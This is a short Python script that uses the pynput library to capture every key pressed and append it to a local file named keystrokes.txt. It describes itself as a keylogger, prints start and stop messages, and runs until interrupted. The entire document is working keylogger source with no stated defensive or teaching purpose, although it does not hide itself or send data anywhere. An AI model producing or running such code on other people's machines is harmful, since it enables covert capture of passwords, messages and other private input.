from pynput import keyboard

# Specify the log file
log_file = 'keystrokes.txt'

# Define the function to handle key press events
def on_key_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}\n')  # Log the character pressed
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f'{key}\n')  # Log special keys

# Start the listener
listener = keyboard.Listener(on_press=on_key_press)
listener.start()

print("Keylogger script is starting... Press Ctrl+C to stop.")

try:
    listener.join()  # Keep the listener running
except KeyboardInterrupt:
    print("Keylogger stopped.")
    listener.stop()  # Stop the listener gracefully
